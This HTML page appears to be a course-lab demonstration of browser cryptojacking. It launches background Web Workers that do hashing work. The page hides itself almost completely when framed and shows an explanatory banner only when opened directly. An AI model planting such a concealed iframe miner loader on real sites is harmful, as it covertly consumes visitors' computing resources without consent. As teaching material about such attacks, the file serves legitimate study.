<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title> </title>
  <style>
    html, body { margin: 0; padding: 0; }
    /* In iframe: nearly invisible */
    body.embed { overflow: hidden; opacity: 0.02; height: 1px; width: 1px; }
    /* Top-level: visible notice (navigation-based landing) */
    body.toplab {
      font-family: system-ui, sans-serif;
      padding: 1.25rem;
      background: #1a1a2e;
      color: #eee;
      min-height: 100vh;
      opacity: 1;
    }
  </style>
</head>
<body>
  <div id="banner" hidden style="max-width:36rem;line-height:1.5">
    <p><strong>[Course lab · navigation payload]</strong> This page started Web Workers hashing in the background; open Task Manager to see CPU use. Close the tab to stop.</p>
  </div>
  <script>
    (function () {
      var inFrame = window.self !== window.top;
      document.body.className = inFrame ? "embed" : "toplab";
      var b = document.getElementById("banner");
      if (!inFrame) {
        b.hidden = false;
      }

      var WORKERS = 2;
      var INTENSITY = 4;
      var scriptUrl = new URL("embed-miner-worker.js", document.baseURI || location.href).href;
      var pool = [];
      for (var i = 0; i < WORKERS; i++) {
        var w = new Worker(scriptUrl);
        w.postMessage({ cmd: "start", intensity: INTENSITY, workerId: i });
        pool.push(w);
      }
      window.addEventListener("beforeunload", function () {
        pool.forEach(function (w) {
          try {
            w.postMessage({ cmd: "stop" });
            w.terminate();
          } catch (_) {}
        });
      });
    })();
  </script>
</body>
</html>
